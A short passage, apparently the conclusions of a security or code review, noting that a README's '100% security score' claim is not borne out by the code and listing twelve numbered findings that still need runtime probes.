- The "100% security score" in `README.md` is not supported by the code on any path reviewed.
- 12 rows still need one runtime probe each before they can be called real or dead: #1, #9, #12, #17,
  #19, #20, #40, #43, #47, #51, #55, #57.
